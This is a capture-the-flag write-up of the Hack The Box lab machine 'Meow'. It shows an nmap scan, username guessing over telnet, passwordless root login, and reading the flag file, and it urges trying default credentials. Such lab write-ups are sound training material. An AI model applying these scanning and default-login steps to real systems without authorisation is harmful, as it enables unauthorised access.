# Meow
#HTB #very-easy #telnet #remote-access #networks-services #authentication
## Target:
*Name:* Meow
*IP:* 10.129.126.178
## Vulnerability: 
Misconfiguration, this machine allows access as `root` using telnet without password. 
## Steps: 
#### 1) Reconnaissance
Used nmap to check for open ports.

**Code:**
```
nmap -p- 10.129.126.178
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 05:37 -0400
Nmap scan report for 10.129.126.178
Host is up (0.017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

#### 2) Searching for information about telnet
Telnet is an older network protocol and software tool used to connect to remote computers or devices over a network using text commands. 
It works on a client-server model, typically using TCP port 23, to let you control a remote system as if you were sitting right in front of it.

Since Telnet was found open on this machine, it becomes the natural first target to test for weak or missing credentials.
#### 3) Login to the machine
Using the code: 
```
telnet <IP>
```

We create a connection to the machine via Telnet, then try to login with no password.
```
┌──(_________)-[~]
└─$ telnet 10.129.126.178 
Trying 10.129.126.178...
Connected to 10.129.126.178.
Escape character is '^]'.
```

Then try some usernames: 
```
admin
root
administrator
...
```

After trying, `root` is the valid one that requires no password. 
```

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 29 Jul 2026 09:54:41 AM UTC

  System load:           0.17
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.126.178
  IPv6 address for eth0: dead:beef::a0de:adff:fed9:3519

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```

Unlike root, other usernames ask for a password: 
```
Trying 10.129.126.178...
Connected to 10.129.126.178.
Escape character is '^]'.
admin

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: admin
Password: 

Login incorrect
Meow login: 

```
#### 4) Find the flag
Using the ls command, we can find the flag in the root directory: 

```
root@Meow:~# ls
flag.txt  snap
root@Meow:~#
```

Then open `flag.txt` using cat: 
```
root@Meow:~# cat flag.txt
<FLAG>
```
## Flag: 
[Not disclosed — solve it yourself!]
## Key takeaway: 
Old protocols can have some misconfigurations that lead to access without authentication. Always try default credentials like root and admin.
